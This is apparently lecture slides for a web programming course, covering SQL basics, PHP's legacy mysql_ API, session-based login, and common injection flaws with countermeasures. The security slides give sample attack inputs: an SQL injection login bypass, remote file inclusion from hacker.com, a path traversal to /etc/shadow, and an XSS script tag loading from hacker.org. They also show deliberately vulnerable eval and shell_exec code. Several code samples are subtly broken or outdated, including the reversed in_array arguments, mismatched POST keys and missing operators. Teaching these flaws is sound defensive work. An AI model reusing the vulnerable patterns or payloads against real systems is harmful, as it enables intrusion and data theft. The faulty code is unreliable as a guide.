@@ -1,0 +1,618 @@
+---
+categories: Classes PHP SQL
+toc: no
+...
+
+<style>
+table { border-collapse: collapse}
+td, th { border: solid thin black}
+</style>
+
+view this as a [slideshow](?export&format=Slidy)
+
+
+# Temporary persistence (PHP sessions)
+
+<img width="60%" src="/php-session.gif" alt="PHP session example" />
+
+We would like a sort of **permanent session store**
+
+**Permanent files:** slow, more load on the web server.
+
+**Database:** fast, decentralized, error recovery, concurrent access.
+
+
+
+# Accessing a database: SQL
+
+**S**tructured **Q**uery **L**anguage
+
+**Data is contained in tables**
+
+--- ----------- ---------- ----------- -----------
+id  first       last       profession  birth
+--- ----------- ---------- ----------- -----------
+1   Edgar       Poe        writer      1809-01-19
+
+2   Mark        Twain      writer      1835-11-30
+
+3   Mika        Salo       pilot       1966-11-30
+
+4   Jack        Kerouac    writer      1922-03-12
+
+5   Jonathan    Swift      writer      1667-11-30
+
+6   Michael     Schumacher pilot       1969-01-03
+
+...
+--- ----------- ---------- ----------- -----------
+
+In this course: **MySQL** syntax.
+
+
+# The SQL language
+
+**Keywords:** (capitalized by convention) `SELECT`, `CREATE`,
+  `UPDATE`, `FROM`, `WHERE`, ...
+
+**Identifiers:** first, last, profession, ...
+
+**Operators:** `<`, `>`, `=`, `<>`, `LIKE`, `+`, `*`, `AND`, `OR`, ...
+
+**Data Types:** text, numeric, dates, mixed, `NULL`, ...
+
+
+
+
+# Access queries
+
+**Queries** return tables (the ordering is not guaranteed)
+
+~~~ {.sql}
+SELECT first, last FROM People WHERE profession='pilot'
+~~~
+
+--- ----------- ----------
+id  first       last      
+--- ----------- ----------
+6   Michael     Schumacher
+
+3   Mika        Salo
+--- ----------- ----------
+
+~~~ {.sql}
+SELECT DISTINCT profession WHERE birth LIKE '%-11-30'
+~~~
+
+-------
+birth
+-------
+writer
+
+pilot
+-------
+
+
+# Joining many tables
+
+----------- -------
+profession  salary
+----------- -------
+pilot       1000K
+
+programmer  60K
+
+writer      50K
+
+professor   40K
+----------- -------
+
+~~~ {.sql}
+SELECT * FROM People p, Salaries s WHERE p.profession = s.profession
+~~~
+
+~~~ {.sql}
+SELECT * FROM People p INNER JOIN Salaries s ON p.profession = s.profession
+~~~
+
+~~~ {.sql}
+SELECT * FROM People INNER JOIN Salaries USING(profession)
+~~~
+
+--- ----------- ---------- ----------- ----------- -------
+id  first       last       profession  birth       salary
+--- ----------- ---------- ----------- ----------- -------
+1   Edgar       Poe        writer      1809-01-19  50K
+
+2   Mark        Twain      writer      1835-11-30  50K
+
+3   Mika        Salo       pilot       1966-11-30  1000K
+
+4   Jack        Kerouac    writer      1922-03-12  50K
+
+...
+--- ----------- ---------- ----------- ----------- -------
+
+
+
+# Modifying tables
+
+
+**Create a new line**
+
+~~~ {.sql}
+INSERT INTO People VALUES ('George', 'Washington', 'president', '1732-02-22')
+~~~
+
+**Delete a line**
+
+~~~ {.sql}
+DELETE FROM People WHERE profession = 'writer'
+~~~
+
+**Edit a line**
+
+~~~ {.sql}
+UPDATE Salaries SET salary = 100k WHERE profession = 'professor'
+~~~
+
+**Create a table**
+
+~~~ {.sql}
+CREATE TABLE Cars (
+    id int NOT NULL AUTO INCREMENT,
+    model varchar(255),
+    constructor varchar(255),
+    color varchar(255),
+    PRIMARY KEY (id)
+)
+~~~
+
+
+**Delete a table**
+
+~~~ {.sql}
+DROP TABLE Salaries
+~~~
+
+
+# SQL quotes and other stuff
+
+**Comments:** using double dash (`--`)
+
+~~~ {.sql}
+-- This is a comment
+~~~
+
+**Strings:** go in **simple** or **double** quotes
+
+~~~ {.sql}
+SELECT * FROM Cars WHERE color = 'blue' AND constructor = "Peugeot"
+~~~
+
+**Backquotes** can be used to include spaces in **identifiers** (MySQL only)
+
+~~~ {.sql}
+SELECT * FROM `French towns`
+~~~
+
+**Wildcards** can be used in `LIKE` expressions
+
+~~~ {.sql}
+SELECT * FROM `French towns` WHERE name LIKE '%les_bains'
+~~~
+
+> - **`%`** matches *any number* of characters
+> - **`_`** matches *exactly one* character
+
+
+# Resources
+
+**The complete MySQL reference**
+
+> <http://dev.mysql.com/doc/refman/5.0/en/>
+
+**A quick and complete reference with examples**
+
+> <http://www.w3schools.com/sql/>
+
+
+
+# MySQL and PHP
+
+The [PHP]() standard library contains two APIs to talk to MySQL
+servers
+
+The **Original MySQL API** <http://www.php.net/manual/book.mysql.php>
+
+> - Imperative, simple, it's been around for a long time.
+> - Functions begin with `mysql_`.
+
+The **MySQL Improved Extension** <http://www.php.net/manual/book.mysqli.php>
+
+> - Object-oriended, richer, newer.
+> - Methods of the `mysqli` class.
+
+
+We will use the Original API for the classes and the tutorials.
+
+Feel free to use the `mysqli` interface if you prefer.
+
+
+# Connecting to the SQL server
+
+**Standard connection**
+
+~~~ {.php}
+<?php
+  $db = mysql_connect('db.example.com', 'db-admin', 'password');
+  if ( ! $db ) {
+    die('Database connection error: ' . mysql_error())
+  }
+  
+  ...
+
+  mysql_close($db);
+~~~
+
+The connection is closed at the end of the script, anyway.
+
+**Persistent connection**
+
+~~~ {.php}
+<?php
+  $db = mysql_pconnect('db.example.com', 'db-admin', 'password');
+  ...
+?>
+~~~
+
+> - If a connection to the same server already exists it is returned instead of a new one.
+> - At the end of the script, the connection is kept open by the web server for future use.
+> - `mysql_close` has no effect.
+
+
+# Querying the SQL server
+
+**Select a database**
+
+~~~ {.php}
+<?php
+  mysql_connect('db.example.com', 'user', 'password');
+  mysql_select_db('my-database', $db);
+?>
+~~~
+
+**Send an SQL query**
+
+~~~ {.php}
+<?php
+  $result = mysql_query("SELECT * FROM Cars WHERE color = 'blue'");
+  
+  if ( ! $result ) {
+    die('Error in query' . mysql_error());
+  }
+?>
+~~~
+
+
+# Reading the result
+
+**Row by row**, in an **array**
+
+~~~ {.php}
+<?php
+  $result = mysql_query("SELECT * FROM Cars WHERE color = 'blue'");
+
+  while ($row = mysql_fetch_row($result)) {
+    foreach ($row as $column)
+      echo $column;
+  }
+?>
+~~~
+
+**Row by row**, in an **associative array**
+
+~~~ {.php}
+<?php
+  $result = mysql_query("SELECT * FROM Cars WHERE color = 'blue'");
+
+  while ($row = mysql_fetch_assoc($result)) {
+    foreach ($row as $column_name => $column_value)
+      echo "$column_name = $column_value";
+  }
+?>
+~~~
+
+Other possibilities:
+[`mysql_fetch_array`](http://www.php.net/manual/function.mysql-fetch-array.php),
+[`mysql_fetch_object`](http://www.php.net/manual/function.mysql-fetch-object.php),
+[`mysql_result`](http://www.php.net/manual/function.mysql-result.php).
+
+
+# An example of user accounts
+
+
+**Read** user provided login/password pair (e.g., via a login form)
+
+~~~ {.php}
+<?php
+  if (!isset($_POST['user']) || !isset($_POST['pass']))
+    die('Missing username or password.');
+    
+  $user = $_POST['user'];
+  $pass = $_POST['password'];
+?>
+~~~
+
+**Connect** to database and check if the login/password is correct
+
+~~~ {.php}
+<?php
+  $db = pconnect('localhost', 'mysql-admin', 'admin');
+  mysql_select_db('mywebapp', $db);
+
+  $result = mysql_query("SELECT * FROM users WHERE login='$user' AND SHA(password)='$pass'")
+?>
+~~~
+
+Password is
+[hashed using SHA](http://en.wikipedia.org/wiki/Password#Form_of_stored_passwords)
+for security (`SHA` is a default MySQL function)
+
+
+---------
+
+
+**Check result** to validate authentication
+
+~~~ {.php}
+<?php
+  if ( ! $row = mysql_fetch_assoc($result) )
+    die('Wrong password');
+?>
+~~~
+
+
+**Start** [PHP]() session and import user data
+
+~~~ {.php}
+<?php
+  session_start();
+  session_unset();   // empty the $_SESSION array
+                     // to avoid residual data
+
+  $_SESSION['loggedin'] = True;  // very important !!
+  
+  $_SESSION['username'] = $row['login'];
+  $_SESSION['sex']      = $row['sex'];
+  $_SESSION['friends']  = $row['friend_list'];
+  $_SESSION['picrure']  = $row['picture'];
+?>
+~~~
+
+-------------
+
+**Render** [HTML]() page and other content
+
+~~~ {.php}
+<?php
+  if ($_SESSION['loggedin'])
+    include('control_panel.php');
+  else
+    include('login.php');
+?>
+~~~
+
+(Sometime later) **Logout** user
+
+~~~ {.php}
+<?php
+  $_SESSION['loggedin'] = False;
+  header('Location: http://www.example.com/successful_logout.php');
+?>
+~~~
+
+
+# Beware of the injection!
+
+![](http://1.bp.blogspot.com/-z3tve_nty_0/TeF3QP2mrVI/AAAAAAAAAQg/OV9f-k04nD4/s1600/2.jpg)
+
+
+# Never trust user data
+
+Take the previous example:
+
+~~~ {.php}
+<?php
+  $user = $_POST['user'];
+  $pass = $_POST['password'];
+  $result = mysql_query("SELECT * FROM users WHERE login='$user' AND SHA(password)='$pass'");
+?>
+~~~
+
+The user passes the following POST parameters:
+
+~~~
+user=root'--&password=injection
+~~~
+
+The [SQL]() query generated by [PHP]() is then
+
+~~~ {.sql}
+SELECT * FROM users WHERE login='root'--' AND SHA(password)='injection'
+~~~
+
+`--` introduces a comment.
+
+Result: **the user is logged in as root!**
+
+
+
+# Countering SQL Injections
+
+The problem is made by some special characters: **`'`**,  **`"`**,  **`\`**, etc.
+
+**Solution:** replace them with  **`\'`**,  **`\"`**,  **`\\`**, etc.
+
+~~~ {.php}
+<?php
+  $result = mysql_query("SELECT * FROM users WHERE login='" .
+                        mysql_real_escape_string($user) . 
+                        "' AND SHA(password)='"
+                        mysql_real_escape_string($pass) . "'");
+?>
+~~~
+
+[mysql_real_escape_string](http://www.php.net/manual/function.mysql-real-escape-string.php)
+is the standard [PHP]() function to **sanitize** [SQL]() query
+strings.
+
+It should be used on **any query** that includes **user input** !
+
+
+
+# Injections in [PHP]()
+
+**Script inclusion injection**
+
+~~~ {.php}
+<?php
+  $lang = $_GET['lang'];
+  include($lang . '.php');
+?>
+~~~
+
+The user gives the following parameters
+
+~~~
+?lang=http://hacker.com/exploit
+~~~
+
+If [PHP]() is configured with the
+[`allow_url_fopen`](http://www.php.net/manual/filesystem.configuration.php#ini.allow-url-fopen)
+directive, the script
+
+    http://hacker.com/exploit.php
+    
+is **downloaded and executed on the local server**!
+
+---------
+
+**File inclusion injection**
+
+~~~ {.php}
+<?php
+  $poem = $_GET['poem'];
+  echo '<pre class="poem">';
+  echo file_get_contents('poems' . $poem);
+  echo '</pre>';
+?>
+~~~
+
+What happens when the user issues this request?
+
+    ?poem=../../../../etc/shadow
+
+Plus the same vulnerability as before, if
+[`allow_url_fopen`](http://www.php.net/manual/filesystem.configuration.php#ini.allow-url-fopen)
+is on.
+
+**Countermeasure** 
+
+~~~ {.php}
+<?php
+  if (in_array($valid_langs, $lang))
+    ...
+  if (in_array($valid_poem, $poem))
+    ...
+?>
+~~~
+
+---------
+
+**Dynamic variable injection**
+
+Using [PHP]()'s double-dollar syntax, one can quickly import all GET
+parameters in **local variables**.
+
+~~~ {.php}
+<?php
+  $search = '';
+  $lang = 'en';
+  foreach ($_GET as $k => $v)
+    $$k = $v;
+
+  ...
+  
+  if ($_SESSION['administrator']) {
+    // administrator-only site
+  }
+?>
+~~~
+
+The user can gain administrator privileges with this request
+
+    ?search=injection&lang=fr&administrator=1
+    
+This used to be a common problem in [PHP]() when
+[register_globals](http://php.net/manual/security.globals.php) was the
+default behavior.
+
+**Countermeasure:** Don't write this code!
+
+
+-----
+
+**Dynamic evaluation injections**
+
+~~~ {.php}
+<?php
+  eval('myfunction(' . $_GET['arg'] . ');');
+  $myfunc = $_GET['func'];
+  $myfunc();
+?>
+~~~
+
+**Shell code injection**
+
+~~~ {.php}
+<?php
+  echo shell_exec('ls -l ' . $_GET['dir']);
+?>
+~~~
+
+All these techniques allow the user to **execute arbitrary code on the
+server**.
+
+**Countermeasure:** simply avoid them!
+
+
+# Injections in HTML: XSS
+
+Injections in the generated [HTML]() output is also called **Cross-Site
+Scripting** ([XSS]()).
+
+~~~ {.php}
+<body>
+<h1>Hi, <?php echo $_COOKIE['username']; ?>!</h1>
+</body>
+~~~
+
+The user may send the request
+
+    ?username=<script src="http://hacker.org/attack.js"></script>
+   
+This is generally not a threat for the server, but it is **a threat
+for the users!**
+
+**Countermeasure** 
+
+Replace **`<`**, **`>`**, **`&`**, ... with **`&lt;`**, **`&gt;`**, **`&amp;`**, ...
+
+~~~ {.php}
+<?php
+  echo htmlspecialchars($_COOKIE['username']);
+?>
+~~~
+
+We will talk more about [XSS]() in the next lessons.
